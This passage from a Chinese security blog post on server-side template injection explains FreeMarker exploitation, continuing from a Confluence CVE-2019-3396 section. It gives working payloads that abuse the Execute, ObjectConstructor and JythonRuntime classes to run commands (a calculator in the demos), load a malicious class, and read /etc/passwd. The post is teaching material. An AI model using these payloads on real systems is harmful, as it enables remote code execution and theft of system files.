<p>根据官方文档的描述，可以看到这是由 widget Connector 这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的_template字段</p>
<p>具体漏洞代码调试可以参考：《<a target="_blank" rel="noopener" href="https://caiqiqi.github.io/2019/11/03/Confluence未授权模板注入-代码执行-CVE-2019-3396/">Confluence未授权模板注入/代码执行(CVE-2019-3396)</a>》</p>
<p>　　　　　　　　　　　　　《[Confluence 未授权RCE分析（CVE-2019-3396）](<a target="_blank" rel="noopener" href="https://lucifaer.com/2019/04/16/Confluence">https://lucifaer.com/2019/04/16/Confluence</a> 未授权RCE分析（CVE-2019-3396）/#0x01-漏洞概述)》</p>
<h2 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h2><p>FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210152321533.png" alt="image-20220210152321533"></p>
<p><strong>FreeMarker模板代码</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Welcome!&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;　&lt;#–这是注释–&gt;</span><br><span class="line">  &lt;h1&gt;Welcome $&#123;user&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">  &lt;p&gt;Our latest product:</span><br><span class="line">  &lt;a href&#x3D;&quot;$&#123;latestProduct.url&#125;&quot;&gt;$&#123;latestProduct.name&#125;&lt;&#x2F;a&gt;!</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${…} 的部分， 之后将结果发送到访问者的Web浏览器中。</p>
<p>这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p>
<p>具体的高级内置函数定义参考《<a target="_blank" rel="noopener" href="https://freemarker.apache.org/docs/ref_builtins_expert.html">Seldom used and expert built-ins</a>》</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210152835575.png" alt="image-20220210152835575"></p>
<p>主要用法如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp &#x3D;&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（）&gt;</span><br><span class="line">&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp_narrow &#x3D;&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（40）&gt;</span><br></pre></td></tr></table></figure>

<p>调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Execute</p>
<p>freemarker.template.utility 里面有个Execute类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>freemarker.template.utility 里面有个ObjectConstructor类，如下图所示，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造一个可执行命令的对象，从而构造远程命令执行漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()</span><br></pre></td></tr></table></figure>

<p>freemarker.template.utility 里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;&#x2F;@value&gt;</span><br></pre></td></tr></table></figure>

<p>这里使用测试代码来大概演示一下：<a target="_blank" rel="noopener" href="https://github.com/hellokoding/springboot-freemarker">https://github.com/hellokoding/springboot-freemarker</a></p>
<p>前端代码　　——&gt;　　hello.ftl</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Hello $&#123;name&#125;!&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;&#x2F;css&#x2F;main.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2 class&#x3D;&quot;hello-title&quot;&gt;Hello $&#123;name&#125;!&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;&#x2F;js&#x2F;main.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>后端代码　　——&gt;　　HelloController.java</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.hellokoding.springboot;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class HelloController &#123;</span><br><span class="line">    @GetMapping(&quot;&#x2F;&quot;)</span><br><span class="line">    public String index() &#123;</span><br><span class="line">        return &quot;index&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;hello&quot;)</span><br><span class="line">    public String hello(Model model, @RequestParam(value&#x3D;&quot;name&quot;, required&#x3D;false, defaultValue&#x3D;&quot;World&quot;) String name) &#123;</span><br><span class="line">        model.addAttribute(&quot;name&quot;, name);</span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上述代码主要编译给定的模版字符串和数据，生成HTML进行输出</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210155732477.png" alt="image-20220210155732477"></p>
<p>模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210155853956.png" alt="image-20220210155853956"></p>
<h3 id="模版注入利用"><a href="#模版注入利用" class="headerlink" title="模版注入利用"></a>模版注入利用</h3><h4 id="new函数的利用"><a href="#new函数的利用" class="headerlink" title="new函数的利用"></a>new函数的利用</h4><p><strong>利用方法一：</strong></p>
<p>freemarker.template.utility 里有个 Execute 类，通过观察源代码里的第 30 行可以看到这个类会调用 Runtime.getRuntime().exec 函数执行它的 aExecute 变量参数值，因此这里可以使用 new 函数传输想要执行的命令作为 aExecute 参数值，从而执行命令。</p>
<p>freemarker.template.utility.Execute 部分文件代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22 public Object exec(List arguments) throws TemplateModelException &#123;</span><br><span class="line">23    StringBuilder aOutputBuffer &#x3D; new StringBuilder();</span><br><span class="line">24    if (arguments.size() &lt; 1) &#123;</span><br><span class="line">25        throw new TemplateModelException(&quot;Need an argument to execute&quot;);</span><br><span class="line">26    &#125; else &#123;</span><br><span class="line">27        String aExecute &#x3D; (String)((String)arguments.get(0));</span><br><span class="line">28</span><br><span class="line">29        try &#123;</span><br><span class="line">30            Process exec &#x3D; Runtime.getRuntime().exec(aExecute);</span><br><span class="line">31            InputStream execOut &#x3D; exec.getInputStream();</span><br><span class="line">32            Throwable var6 &#x3D; null;</span><br></pre></td></tr></table></figure>

<p>构造padyload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;open -a Calculator&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171412511.png" alt="image-20220210171412511"></p>
<p><strong>利用方法二：</strong></p>
<p>freemarker.template.utility 里有个 ObjectConstructor 类，通过观察源代码里的第 25 行可以看到这个类会把它的参数作为名称构造一个实例化对象。</p>
<p>因此也可以利用这一点构造一个可执行命令的对象，从而 RCE</p>
<p>freemarker.template.utility.ObjectConstructor 部分文件代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">17 public class ObjectConstructor implements TemplateMethodModelEx &#123;</span><br><span class="line">18     public ObjectConstructor() &#123;</span><br><span class="line">19     &#125;</span><br><span class="line">20 </span><br><span class="line">21     public Object exec(List args) throws TemplateModelException &#123;</span><br><span class="line">22         if (args.isEmpty()) &#123;</span><br><span class="line">23             throw new TemplateModelException(&quot;This method must have at least one argument, the name of the class to instantiate.&quot;);</span><br><span class="line">24         &#125; else &#123;</span><br><span class="line">25             String classname &#x3D; args.get(0).toString();</span><br><span class="line">26             Class cl &#x3D; null;</span><br><span class="line">27 </span><br><span class="line">28             try &#123;</span><br><span class="line">29                 cl &#x3D; ClassUtil.forName(classname);</span><br><span class="line">30             &#125; catch (Exception var6) &#123;</span><br><span class="line">31                 throw new TemplateModelException(var6.getMessage());</span><br><span class="line">32             &#125;</span><br></pre></td></tr></table></figure>

<p>构造Payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;open&quot;,&quot;-a&quot;,&quot;Calculator&quot;).start()&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171630301.png" alt="image-20220210171630301"></p>
<p><strong>利用方法三：</strong></p>
<p>freemarker.template.utility 里有个 JythonRuntime 类，这里可以通过自定义标签的方式执行 Python 命令，从而构造远程命令执行。</p>
<p>freemarker.template.utility.JythonRuntime 部分文件代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class JythonRuntime extends PythonInterpreter</span><br><span class="line">    implements TemplateTransformModel &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Writer getWriter(final Writer out,</span><br><span class="line">                            final Map args) &#123;</span><br><span class="line">        final StringBuilder buf &#x3D; new StringBuilder();</span><br><span class="line">        final Environment env &#x3D; Environment.getCurrentEnvironment();</span><br><span class="line">        return new Writer() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void write(char cbuf[], int off, int len) &#123;</span><br><span class="line">                buf.append(cbuf, off, len);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void flush() throws IOException &#123;</span><br><span class="line">                interpretBuffer();</span><br><span class="line">                out.flush();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public void close() &#123;</span><br><span class="line">                interpretBuffer();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            private void interpretBuffer() &#123;</span><br><span class="line">                synchronized (JythonRuntime.this) &#123;</span><br><span class="line">                    PyObject prevOut &#x3D; systemState.stdout;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        setOut(out);</span><br><span class="line">                        set(&quot;env&quot;, env);</span><br><span class="line">                        exec(buf.toString());</span><br><span class="line">                        buf.setLength(0);</span><br><span class="line">                    &#125; finally &#123;</span><br><span class="line">                        setOut(prevOut);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造payload如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;open -a Calculator&quot;)&lt;&#x2F;@value&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220210171935973.png" alt="image-20220210171935973"></p>
<h4 id="API函数的利用"><a href="#API函数的利用" class="headerlink" title="API函数的利用"></a>API函数的利用</h4><p>除了 new 函数，还可以利用 api 函数调用 Java API，然后通过 getClassLoader 获取类加载器从而加载恶意类，或者也可以通过 getResource 来实现任意文件读取。</p>
<p>加载恶意类的 Payload 如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">#assign</span> <span class="attr">classLoader</span>=<span class="string">object?api.class.getClassLoader()</span>&gt;</span>$&#123;classLoader.loadClass(&quot;Evil.class&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>任意文件读取的 Payload 如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">#assign</span> <span class="attr">uri</span>=<span class="string">object?api.class.getResource(</span>&quot;/&quot;)<span class="attr">.toURI</span>()&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">#assign</span> <span class="attr">input</span>=<span class="string">uri?api.create(</span>&quot;<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>&quot;)<span class="attr">.toURL</span>()<span class="attr">.openConnection</span>()&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">#assign</span> <span class="attr">is</span>=<span class="string">input?api.getInputStream()</span>&gt;</span></span><br><span class="line">  FILE:[<span class="tag">&lt;<span class="name">#list</span> <span class="attr">0..999999999</span> <span class="attr">as</span> <span class="attr">_</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">#assign</span> <span class="attr">byte</span>=<span class="string">is.read()</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">#if</span> <span class="attr">byte</span> == <span class="string">-1</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">#break</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">#if</span>&gt;</span></span><br><span class="line">  $&#123;byte&#125;, <span class="tag">&lt;/<span class="name">#list</span>&gt;</span>]</span><br></pre></td></tr></table></figure>

<p>不过 api 内建函数并不能随便使用，必须在配置项 apiBuiltinEnabled 为 true 时才有效，而该配置在 2.3.22 版本之后默认为 false</p>
<p>同时 FreeMarker 为了防御通过其他方式调用恶意方法，FreeMarker 内置了一份危险方法名单 unsafeMethods.properties，例如 getClassLoader、newInstance 等危险方法都被禁用了。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9b39d39d4f42">https://www.jianshu.com/p/9b39d39d4f42</a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>SSTI模版注入学习</p><p><a href="http://www.ol4three.com/2022/01/12/WEB/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">http://www.ol4three.com/2022/01/12/WEB/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>ol4three</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-01-12</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2022-02-22</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/SSTI/">SSTI </a></div></div><div class="sharethis-inline-share-buttons"></div><script src=" " defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button is-info donate"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20230128152554.png" alt="Alipay"></span></a><a class="button is-success donate"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/20230128152647.png" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2022/03/11/Android/objection-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">objection 使用详解</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/12/21/Android/frida/Frida-Hook-%E6%80%BB%E7%BB%93/"><span class="level-item">Frida Hook 总结</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({
            el: '#valine-thread' ,
            appId: "Mi7VTJ1Ohx0XKeYNBRfjWrY5-gzGzoHsz",
            appKey: "kqSPJKxTTPM9aNVRrWttS4HT",
            
            avatar: "mm",
            
            meta: ["nick","mail","link"],
            pageSize: 10,
            lang: "en",
            
            highlight: true,
            
            
            
            
            
            requiredFields: [],
        });</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="ol4three"></figure><p class="title is-size-4 is-block line-height-inherit">ol4three</p><p class="is-size-6 is-block">醒来时世界都远了，我需要最狂的风，和最静的海。</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>BeiJing,China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">113</p></a></div></div><a class="level-item has-text-centered is-marginless" href="/categories"><div><p class="heading">Categories</p><div><p class="title">9</p></div></div></a><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">104</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ol4three" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ol4three"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="is-flex" href="#模版引擎"><span class="mr-2">1</span><span>模版引擎</span></a></li><li><a class="is-flex" href="#SSTI-模版注入"><span class="mr-2">2</span><span>SSTI(模版注入)</span></a><ul class="menu-list"><li><a class="is-flex" href="#附表"><span class="mr-2">2.1</span><span>附表</span></a></li></ul></li><li><a class="is-flex" href="#PHP中的SSTI"><span class="mr-2">3</span><span>PHP中的SSTI</span></a><ul class="menu-list"><li><a class="is-flex" href="#Twig"><span class="mr-2">3.1</span><span>Twig</span></a></li><li><a class="is-flex" href="#Smarty"><span class="mr-2">3.2</span><span>Smarty</span></a><ul class="menu-list"><li><a class="is-flex" href="#CTF实例讲解"><span class="mr-2">3.2.1</span><span>CTF实例讲解</span></a></li><li><a class="is-flex" href="#getstreamvariable"><span class="mr-2">3.2.2</span><span>getstreamvariable</span></a></li></ul></li><li><a class="is-flex" href="#Blade"><span class="mr-2">3.3</span><span>Blade</span></a></li></ul></li><li><a class="is-flex" href="#Python中的SSTI"><span class="mr-2">4</span><span>Python中的SSTI</span></a><ul class="menu-list"><li><a class="is-flex" href="#Jinja2"><span class="mr-2">4.1</span><span>Jinja2</span></a><ul class="menu-list"><li><a class="is-flex" href="#用file对象来读取文件"><span class="mr-2">4.1.1</span><span>用file对象来读取文件</span></a></li><li><a class="is-flex" href="#使用内置模块执行命令"><span class="mr-2">4.1.2</span><span>使用内置模块执行命令</span></a></li><li><a class="is-flex" href="#基础payload"><span class="mr-2">4.1.3</span><span>基础payload</span></a></li><li><a class="is-flex" href="#利用实例"><span class="mr-2">4.1.4</span><span>利用实例</span></a></li></ul></li><li><a class="is-flex" href="#Tornado"><span class="mr-2">4.2</span><span>Tornado</span></a></li><li><a class="is-flex" href="#Django"><span class="mr-2">4.3</span><span>Django</span></a></li></ul></li><li><a class="is-flex" href="#Java中的SSTI"><span class="mr-2">5</span><span>Java中的SSTI</span></a><ul class="menu-list"><li><a class="is-flex" href="#velocity"><span class="mr-2">5.1</span><span>velocity</span></a></li><li><a class="is-flex" href="#Confluence未授权RCE分析"><span class="mr-2">5.2</span><span>Confluence未授权RCE分析</span></a></li><li><a class="is-flex" href="#FreeMarker"><span class="mr-2">5.3</span><span>FreeMarker</span></a><ul class="menu-list"><li><a class="is-flex" href="#API函数的利用"><span class="mr-2">5.3.1</span><span>API函数的利用</span></a></li></ul></li></ul></li><li><a class="is-flex" href="#参考链接"><span class="mr-2">6</span><span>参考链接</span></a></li></ul></div></div><style>.menu-list > li > a.is-active + .menu-list { display: block; }.menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile is-mobile" href="http://b0urne.top" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">B0urne</span></span><span class="level-right"><span class="level-item tag">b0urne.top</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://lalalaxiaoyuren.github.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">smail_fish</span></span><span class="level-right"><span class="level-item tag">lalalaxiaoyuren.github.io</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://vinadiakt.github.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">vinadiak</span></span><span class="level-right"><span class="level-item tag">vinadiakt.github.io</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/Android/"><span class="level-start"><span class="level-item">Android</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/IOT/"><span class="level-start"><span class="level-item">IOT</span></span><span class="level-end"><span class="level-item tag">25</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/PWN/"><span class="level-start"><span class="level-item">PWN</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/WEB%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">WEB安全</span></span><span class="level-end"><span class="level-item tag">44</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">二进制安全</span></span><span class="level-end"><span class="level-item tag">14</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">内网渗透</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><span class="level-start"><span class="level-item">环境配置</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E8%B7%AF%E7%94%B1%E5%99%A8/"><span class="level-start"><span class="level-item">路由器</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2022-04-12T07:15:36.000Z">2022-04-12</time></p><p class="title is-6"><a class="link-muted" href="/2022/04/12/Android/objectioin%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/">objectioin实战详解</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/Android/">Android</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2022-03-11T08:46:22.000Z">2022-03-11</time></p><p class="title is-6"><a class="link-muted" href="/2022/03/11/Android/objection-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/">objection 使用详解</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/Android/">Android</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2022-01-12T08:36:19.000Z">2022-01-12</time></p><p class="title is-6"><a class="link-muted" href="/2022/01/12/WEB/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">SSTI模版注入学习</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2021-12-21T10:40:00.000Z">2021-12-21</time></p><p class="title is-6"><a class="link-muted" href="/2021/12/21/Android/frida/Frida-Hook-%E6%80%BB%E7%BB%93/">Frida Hook 总结</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/Android/">Android</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2021-12-06T02:26:08.000Z">2021-12-06</time></p><p class="title is-6"><a class="link-muted" href="/2021/12/06/Android/APP%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/">APP测试常见问题总结</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/Android/">Android</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/360/"><span class="tag">360</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/APP%E6%B5%8B%E8%AF%95/"><span class="tag">APP测试</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AWD/"><span class="tag">AWD</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ActiveMQ/"><span class="tag">ActiveMQ</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Amazon/"><span class="tag">Amazon</span><span class="tag is-grey-lightest">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apache/"><span class="tag">Apache</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apache-Cocoon-XML/"><span class="tag">Apache-Cocoon-XML</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apereo-Cas/"><span class="tag">Apereo Cas</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/AppWeb/"><span class="tag">AppWeb</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Apple-T2/"><span class="tag">Apple T2</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/BLE/"><span class="tag">BLE</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/BadUsb/"><span class="tag">BadUsb</span><span class="tag is-grey-lightest">1</span></a></div><div class="control"><a class="tags has-addons" 